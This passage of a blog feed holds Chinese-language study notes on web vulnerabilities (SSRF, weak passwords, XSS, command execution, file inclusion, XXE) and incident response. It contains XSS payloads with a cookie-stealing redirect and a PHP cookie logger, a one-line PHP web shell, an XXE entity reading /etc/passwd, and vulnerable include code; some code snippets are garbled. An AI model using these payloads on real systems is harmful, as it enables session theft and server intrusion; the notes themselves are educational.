    <content type="html"><![CDATA[<p>SSRF是由攻击者构造形成的，并由服务器发起请求的一类计算机安全漏洞。SSRF攻击的主要目标是从外网无法访问的内网系统，正是因为他是有服务器发起的，所以能够请求到与他先开你而与外网隔离的内网系统。</p>        <h2 id="SSRF原理">          <a href="#SSRF原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h2>      <p>SSRF攻击是通过篡改获取资源的请求发送给内部服务器实现的，但是内部服务器并未判断这个请求是否合法就以他的身份来访问其他内部服务i起的资源。</p>        <h3 id="补充">          <a href="#补充" class="heading-link"><i class="fas fa-link"></i></a><a href="#补充" class="headerlink" title="补充"></a>补充</h3>      <p>XSS、CSRF、SSRF这三类安全漏洞的共同之处都是由服务器程序对用户提交的请求数据过滤不严或者过于信任导致的。不同之处在于，XSS的成因是服务器程序对用户提交的请求未进行安全过滤，从而导致浏览器在渲染服务器程序返回的HTML页面时，用户提交的恶意代码被执行；CSRF攻击的成因是服务器程序未对用户提交的数据进行随机值校验且对HTTP请求包内的REFER字段校验不严，导致攻击者可以利用用户本地的COOKIE伪造用户请求发送至服务器程序；SSRF攻击的成因是服务器程序对用户提交的URL过于信任二没有对用户提交的URL进行地址限制及安全过滤，导致攻击者可以此为跳板刺探内网信息或者渗透网络。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SSRF是由攻击者构造形成的，并由服务器发起请求的一类计算机安全漏洞。SSRF攻击的主要目标是从外网无法访问的内网系统，正是因为他是有服务器发起的，所以能够请求到与他先开你而与外网隔离的内网系统。&lt;/p&gt;

        &lt;h2 id=&quot;SSRF原理&quot;&gt;
        </summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>弱口令漏洞</title>
    <link href="http://example.com/2021/03/28/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/28/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-28T05:40:09.819Z</published>
    <updated>2021-03-28T05:56:28.221Z</updated>
    
    <content type="html"><![CDATA[<p>一般弱口令为系统默认密码或设置的简单密码，密码非常容易被攻击者猜到。</p>        <h2 id="弱口令一般出现的地方">          <a href="#弱口令一般出现的地方" class="heading-link"><i class="fas fa-link"></i></a><a href="#弱口令一般出现的地方" class="headerlink" title="弱口令一般出现的地方"></a>弱口令一般出现的地方</h2>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WEB层面：后台管理员登录、普通用户登录；中间件层面：MYSQL弱口令、MSSQL弱口令、ORACLE弱口令、TOMCAT弱口令及PHPMYADMIN弱口令等；系统层面：ftp弱口令、3389弱口令、ssh弱口令、telnet弱口令及网关与路由登录弱口令等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>任何一种类型的漏洞，都没有弱口令来的简单、奏效。弱口令一般对后台管理员登陆界面和远程3389/21/22/23/1433/3306/1521等服务端口进行攻击。</p>        <h3 id="后台及服务端口的寻找">          <a href="#后台及服务端口的寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#后台及服务端口的寻找" class="headerlink" title="后台及服务端口的寻找"></a>后台及服务端口的寻找</h3>      <p>后台：GoogleHack、GitHubHack、robots.txt及SVN或者GIT代码泄露等；<br>远程端口：使用相应远程端口协议的爆破工具；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一般弱口令为系统默认密码或设置的简单密码，密码非常容易被攻击者猜到。&lt;/p&gt;

        &lt;h2 id=&quot;弱口令一般出现的地方&quot;&gt;
          &lt;a href=&quot;#弱口令一般出现的地方&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas f</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>网络安全应急响应概念、方法、场景</title>
    <link href="http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E5%BF%B5%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%9C%BA%E6%99%AF/"/>
    <id>http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E5%BF%B5%E3%80%81%E6%96%B9%E6%B3%95%E3%80%81%E5%9C%BA%E6%99%AF/</id>
    <published>2021-03-27T20:15:32.070Z</published>
    <updated>2021-03-28T07:08:54.233Z</updated>
    
    <content type="html"><![CDATA[<p>网络安全应急响应是安全防护的最后一道防线，巩固应急防线对安全能力建设至关重要。</p>        <h2 id="网络应急响应基本概念">          <a href="#网络应急响应基本概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#网络应急响应基本概念" class="headerlink" title="网络应急响应基本概念"></a>网络应急响应基本概念</h2>      <p>网络安全是指网络系统的硬件、软件及系统中的数据受到保护，不因偶然的或恶意的原因遭到破坏、更改、泄露，保证系统连续、可靠、正常运行。网络服务不中断。面对各种新奇怪异的病毒和不计其数的安全漏洞，建立有效的网络安全应急体系并使之不断完善。</p><p>网络按全应急响应是指对已经发生的或者可能发生的安全事件进行监控、分析、协调、处理、保护资产安全。网络安全应急响应主要是为了人们对网络安全有所认识、有所准备，以便在遇到突发网络安全时间时做到有效应对、妥善处理。</p><p>网络安全应急响应主要包括俩个方面：</p><p>1、未雨绸缪，在事件发生前做好准备。<br>2、亡羊补牢，在事件发生后采取响应措施（系统备份、病毒检测、后门检测、清除病毒或后门、隔离、系统恢复、调查与追踪、入侵取证），把事件造成的损失降到最小。</p>        <h2 id="网络安全应急响应方法">          <a href="#网络安全应急响应方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#网络安全应急响应方法" class="headerlink" title="网络安全应急响应方法"></a>网络安全应急响应方法</h2>              <h3 id="PDCERF-6阶段-方法">          <a href="#PDCERF-6阶段-方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#PDCERF-6阶段-方法" class="headerlink" title="PDCERF(6阶段)方法"></a>PDCERF(6阶段)方法</h3>      <p>1、准备阶段，准备阶段以预防为主，主要建立一些防止入侵或者入侵监控的体系。<br>2、检测阶段，检测阶段主要检测事件是已经发生还是正在进行中，以及事件产生的原因。通过汇总，查看是否发生了全网的大规模事件，从而确定应急等级及其应急的方案。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">一般典型的事件现象包括：（1）账号被盗用；（2）骚扰性的垃圾信息；（3）业务服务功能失效；（4）业务内容被明显篡改；（5）系统崩溃，资源不足；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、抑制阶段，抑制阶段主要任务是限制攻击波及的范围，同时也是在降低损失。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">抑制策略：（1）完全关闭所有系统；（2）从网络上断开主机或断开部分网络；（3）修改所有防火墙或路由器过滤规则；（4<span class="token punctuation">)</span>封锁或删除被登录的登录账号；（5）加强对系统网络行为的监控；（6）设置诱饵服务器进一步获取事件信息；（7）关闭攻击的系统 或者关闭其他相关系统的不分服务；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、根除阶段，根除阶段主要任务是找出根源并彻底根除，避免攻击者再次使用相同的手法攻击。</p><p>5、恢复阶段，恢复阶段主要任务是把将破坏的信息彻底还原为正常运作状态。</p><p>6、总结阶段，总结阶段主要任务是回顾应急响应过程的相关信息，进行事后分析总结和修订按全计划、政策、程序，并进行训练，防止入侵再次发生。</p>        <h3 id="网络安全应急响应处置流程">          <a href="#网络安全应急响应处置流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#网络安全应急响应处置流程" class="headerlink" title="网络安全应急响应处置流程"></a>网络安全应急响应处置流程</h3>      <p>在日常中一般都是在事件发生后进行问题排查及溯源。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">常见网络安全应急响应的场景：（1）勒索病毒；（2）挖矿木马；（3）Webshell<span class="token punctuation">;</span>（4）网页篡改；（5）DDoS攻击；（6）数据泄露；（7）流量劫持；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在处置过程中，先要确定事件类型与事件范围，针对不同的事件类型，制定相关的应急方案和策略。随后对相关的主机进行排查，一般会从系统排查、进程排查、服务排查、文件痕迹排查、日志分析等方面进行，张合相关信息，进行关联推理，最后给出事件结论。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">网络安全应急响应分析流程：（1）事件类型；（2）时间范围；（3）系统排查；（4）进程排查；（5）服务排查；（6）文件痕迹排查；（7）日志分析；   <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>        关联推理       最后的出结论<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;网络安全应急响应是安全防护的最后一道防线，巩固应急防线对安全能力建设至关重要。&lt;/p&gt;

        &lt;h2 id=&quot;网络应急响应基本概念&quot;&gt;
          &lt;a href=&quot;#网络应急响应基本概念&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;</summary>
      
    
    
    
    <category term="网络安全应急响应" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="网络安全应急响应" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>跨站脚本漏洞XSS</title>
    <link href="http://example.com/2021/03/27/XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/27/XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-27T06:05:36.410Z</published>
    <updated>2021-03-27T06:44:47.072Z</updated>
    
    <content type="html"><![CDATA[<p>在XSS漏洞中，攻击者可以在正常页面植入JavaScript和HTML等代码，进而执行植入代码的漏洞。其漏洞存在的原因是，WEB应用没有对用户直接或间接控制的参数做出关键字过滤或关键字转义处理。</p><p>攻击者可以控制的参数有URL参数、POST提交的表单和搜索框提交的搜素关键字。在URL参数、POST提交的表单和搜索框提交的搜素关键字处进行数据修改，然后看页面返回那些关键字，能不能构造弹窗，如果能就存在XSS漏洞。</p>        <h2 id="弹窗代码">          <a href="#弹窗代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#弹窗代码" class="headerlink" title="弹窗代码"></a>弹窗代码</h2>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;1&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;svgonload=prompt(1);&gt;</span><br><span class="line">&lt;body onload=prompt(1);&gt;</span><br><span class="line">&lt;a onclick=alert( 1)&gt;M</span><br><span class="line">&lt;img/src/onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="string">&#x27;1&#x27;</span>)&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(1)&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;1&#x27;)&quot;</span>&gt;link&lt;/a&gt;</span><br><span class="line">&lt;button/Onclick= =alert(1)&gt;M</span><br><span class="line">&lt;audio src=1 onloadstart=alert(1)&gt;</span><br><span class="line">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;video/src/onerror=prompt(1);&gt;</span><br><span class="line">&lt;input/onfocus=<span class="string">&quot;lert(1&quot;</span>)<span class="string">&quot;/autofocus/&gt;</span></span><br></pre></td></tr></table></div></figure><p>如果能跳出弹窗，可以将相应alert()语句换成alert(document.cookie)等语句，进而弹出当前用户的Cookie。</p>        <h3 id="收集大量cookie">          <a href="#收集大量cookie" class="heading-link"><i class="fas fa-link"></i></a><a href="#收集大量cookie" class="headerlink" title="收集大量cookie"></a>收集大量cookie</h3>      <p>将&lt;svg/onload= alert(document.cookie)&gt;等语句改成代码: 【A】(因存在解析，请看本页最后补充)，此时相应服务器Web根目录下的cookie.php代码如下。</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_</span> GET[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a);</span></span><br><span class="line"><span class="string">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> .&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">fclose(<span class="variable">$log</span>);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>通过这样的代码，可以收集所有访问该XSS漏洞页面用户的Cookie,并且将收集到的所有Cookie都保存到相应服务器Web根目录下的cookie.txt文件中。如果站点的流量大，cookie.txt文件 中Cookie就多。换句话说，站点流量的大小直接决定收集Cookie的多少。当然，这只是PHP代码收集Cookie的代码，其他语言的代码也可以收集Cookie,且可以根据具体服务器环境，选择不同的收集Cookie的代码。一 旦攻击者收集到Cookie,就会用来欺骗普通用户或者管理员了。</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代码【A】</span><br><span class="line">&lt;script&gt; document.location =<span class="string">&#x27;http://baidu.com/cookie.php?cookie=&#x27;</span>+ document.cookie; &lt;/script&gt;</span><br></pre></td></tr></table></div></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在XSS漏洞中，攻击者可以在正常页面植入JavaScript和HTML等代码，进而执行植入代码的漏洞。其漏洞存在的原因是，WEB应用没有对用户直接或间接控制的参数做出关键字过滤或关键字转义处理。&lt;/p&gt;
&lt;p&gt;攻击者可以控制的参数有URL参数、POST提交的表单和搜索框提交</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="http://example.com/2021/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-27T03:23:24.486Z</published>
    <updated>2021-03-27T04:15:59.813Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行漏洞的效果类似包含攻击，主要是由于输入的参数被当成命令来执行。命令执行漏洞分为远程执行漏洞和本地命令执行漏洞，远程执行命令漏洞的危害范围远大于本地执行命令。</p>        <h2 id="命令执行漏洞的产生">          <a href="#命令执行漏洞的产生" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令执行漏洞的产生" class="headerlink" title="命令执行漏洞的产生"></a>命令执行漏洞的产生</h2>      <hr><p>如果目标站点在设计时其过滤功能不严格或数据与代码区分不明显，就有很大的可能导致命令执行漏洞的存在。</p><p>###举例</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></div></figure><p>在上面的PHP小马中，就以eval的方式将POST过来的参数数据以PHP的方式加以执行。其中，h参数由外部传入，也就是成为攻击者的可控参数，从而形成远程命令执行的漏洞。</p>        <h3 id="利用系统函数实现远程命令执行">          <a href="#利用系统函数实现远程命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用系统函数实现远程命令执行" class="headerlink" title="利用系统函数实现远程命令执行"></a>利用系统函数实现远程命令执行</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>()、assert()、preg_replace()、call_user_func()</span><br></pre></td></tr></table></div></figure><p>在PHP下,允许远程命令执行的函数有eval()、assert()preg_ replace()call user func()。如果页面中存在上述函数且其参数可被用户控制，同时没有对参数做有效的过滤，那么就可能存在远程命令执行漏洞。</p>        <h3 id="eval-与assert-函数的区别">          <a href="#eval-与assert-函数的区别" class="heading-link"><i class="fas fa-link"></i></a><a href="#eval-与assert-函数的区别" class="headerlink" title="eval()与assert()函数的区别"></a>eval()与assert()函数的区别</h3>      <hr><p>eval()与assert()函数在执行效果上基本相同，都可以动态执行代码，且接收的参数为字符串。assert()函数虽然也会执行参数内的代码，但主要用来判断一个表达式是否成立，并返回true或false。实战中，eval()函数通常 会被系统禁用，因此在一句话木马中通常利用assert(来实现代码执行。但需要注意的是:eval参数必须是合法的PHP代码，必须以分号结尾，否则会报错。比如:</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot; phpinfo() &quot;</span>);    //不可执行</span><br><span class="line">assert(<span class="string">&quot; phpinfo0 &quot;</span>);  //可执行</span><br></pre></td></tr></table></div></figure><p>eval()函数正确执行的方式应该是eval(“phpinfo(); “)，即应符合PHP的代码规范，须在phpinfo()后面添加”;”否则将报错</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error:syntax error, unexpected  <span class="variable">$end</span> <span class="keyword">in</span> C:\phpstudy\WWW\eval.php(4):   <span class="built_in">eval</span>()<span class="string">&#x27;d code on line 1 a</span></span><br></pre></td></tr></table></div></figure><p>而assert()函数则不存在这个问题，也就是它针对PHP语法规范要求并不明显。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;命令执行漏洞的效果类似包含攻击，主要是由于输入的参数被当成命令来执行。命令执行漏洞分为远程执行漏洞和本地命令执行漏洞，远程执行命令漏洞的危害范围远大于本地执行命令。&lt;/p&gt;

        &lt;h2 id=&quot;命令执行漏洞的产生&quot;&gt;
          &lt;a href=&quot;#命</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="http://example.com/2021/03/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-26T16:27:11.304Z</published>
    <updated>2021-03-27T06:00:26.680Z</updated>
    
    <content type="html"><![CDATA[<p>文件包含漏洞一般存在于含有大量交互功能的站点，该站点为了实现单一文件在不同页面的使用，通常利用文件包含的方式，将本地可以被重复用的文件利用包含函数在当前页面执行。如果某个页面具有这种功能，并且在这个包含的过程中，被包含文件名可以通过参数的方式被客户端控制，那么就存在文件包含漏洞。</p><p>文件包含漏洞是指当PHP函数引入文件时，没有合理校验传入的文件名，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。PHP文件包含漏洞根据包含的内容来源分为本地文件包含漏洞(LFI) 和远程文件包含漏洞(RFI) 。文件包含漏洞在利用时能够打开并包含本地文件并可利用此类漏洞查看系统任意文件内容，如果具备- -些条件，也可以执行命令。</p><p>在PHP环境下，可利用include、require、include_ once、、require_once函数调用文件，实现文件包含的效果。一般情况下，均会利用include实现对配置、通用函数的加载，实现代码的复用，并且可使站点的结构非常清晰。但在部分情况下会利用包含函数实现对特定文件的包含，如用户上传的文件需展示等。在这种情况下，包含函数所弓|用的文件地点及类型可被用户控制，从而产生了文件包含攻击的可能性。</p>        <h2 id="文件包含漏洞原理">          <a href="#文件包含漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h2>      <p>文件包含漏洞是代码注入的一-种,他的原理就是注入一段用户能控制的脚本或代码，并让服务器端以某种方式执行用户传入参数。这就导致文件包含漏洞可被利用的一种方式为Web木马利用各种方式部署在服务器上，并且木马文件或源码可被攻击者利用包含函数打开，导致Web木马被执行，从而使攻击成功。</p>        <h3 id="文件包含漏洞服务器功能代码">          <a href="#文件包含漏洞服务器功能代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含漏洞服务器功能代码" class="headerlink" title="文件包含漏洞服务器功能代码"></a>文件包含漏洞服务器功能代码</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line"><span class="variable">$file</span>= <span class="variable">$_</span> GET[file<span class="string">&quot;];</span></span><br><span class="line"><span class="string">if(<span class="variable">$fi</span> le)&#123;</span></span><br><span class="line"><span class="string">include(<span class="variable">$file</span>);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>服务器端在得到变量$filename的值后带入include()函数中。<br>服务区端通过GET方式获得用户传入的file参数，并在获得$file后，没有进行任何过滤就对file给出的地址进行包含。</p>        <h3 id="file参数代码">          <a href="#file参数代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#file参数代码" class="headerlink" title="file参数代码"></a>file参数代码</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpinfo.php</span><br></pre></td></tr></table></div></figure><p>服务器会执行include(../phpinfo.php)，phpinfo可以输出大量当前服务器信息，包含对应版本、操作系统信息、绝对路径、中间件类型等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文件包含漏洞一般存在于含有大量交互功能的站点，该站点为了实现单一文件在不同页面的使用，通常利用文件包含的方式，将本地可以被重复用的文件利用包含函数在当前页面执行。如果某个页面具有这种功能，并且在这个包含的过程中，被包含文件名可以通过参数的方式被客户端控制，那么就存在文件包含</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>XML外部实体注入</title>
    <link href="http://example.com/2021/03/26/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/03/26/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</id>
    <published>2021-03-26T09:13:53.646Z</published>
    <updated>2021-03-26T17:11:27.576Z</updated>
    
    <content type="html"><![CDATA[<p>XML本身是一种类似于txt、Excel的文件类型 。当服务器程序在解析XML文件的时候，若XML文件里存在访问系统敏感文件的XML命令语句，就非常危险了。攻击者通过客户端注入一些操纵敏感文件及执行系统命令的XML语句到服务器中的XML文件里。服务器程序就会解析该XML文件并将解析的结果返回给用户。攻击者就达到了获取服务器上敏感文件的内容及执行系统命令的目的。</p>        <h2 id="原理举例">          <a href="#原理举例" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理举例" class="headerlink" title="原理举例"></a>原理举例</h2>              <h3 id="攻击者在客户端构造语句">          <a href="#攻击者在客户端构造语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击者在客户端构造语句" class="headerlink" title="攻击者在客户端构造语句"></a>攻击者在客户端构造语句</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>  encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe                                                 &lt;--定义变量xxe--&gt;</span><br><span class="line">[&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY  xxe  SYSTEM <span class="string">&quot;file:///etc/passswd&quot;</span>&gt;   &lt;--将变量xxe赋值为SYSTEM <span class="string">&quot;file:///etc/passswd&quot;</span>--&gt;</span><br><span class="line">]</span><br><span class="line">&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;             &lt;--通过&amp;xxe输出变量xxe中的值--&gt;</span><br></pre></td></tr></table></div></figure><p>如果这个构造语句已经被攻击者注入服务器上的某个XML文件中，服务器程序在解析的时候，XML文件里的system函数就会读取/etc/passwd文件的内容，如果是系统命令的话就执行系统命令。</p>        <h3 id="服务器程序解析XML文件转化为下面的代码">          <a href="#服务器程序解析XML文件转化为下面的代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#服务器程序解析XML文件转化为下面的代码" class="headerlink" title="服务器程序解析XML文件转化为下面的代码"></a>服务器程序解析XML文件转化为下面的代码</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;xxe.xml&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;XML本身是一种类似于txt、Excel的文件类型 。当服务器程序在解析XML文件的时候，若XML文件里存在访问系统敏感文件的XML命令语句，就非常危险了。攻击者通过客户端注入一些操纵敏感文件及执行系统命令的XML语句到服务器中的XML文件里。服务器程序就会解析该XML文件</summary>
      
    
    
    
    <category term="漏洞原理" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="漏洞原理" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>学习笔记</title>
    <link href="http://example.com/2021/03/01/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/03/01/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-02-28T17:49:02.074Z</published>
    <updated>2021-03-29T05:59:18.335Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <span class="exturl"><a class="exturl__link" href="https://hexo.io/">Hexo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>! This is your very first post. Check <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/">documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl"><a class="exturl__link" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or you can ask me on <span class="exturl"><a class="exturl__link" href="https://github.com/hexojs/hexo/issues">GitHub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>        <h2 id="Quick-Start">          <a href="#Quick-Start" class="heading-link"><i class="fas fa-link"></i></a><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2>              <h3 id="Create-a-new-post">          <a href="#Create-a-new-post" class="heading-link"><i class="fas fa-link"></i></a><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3>      <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New 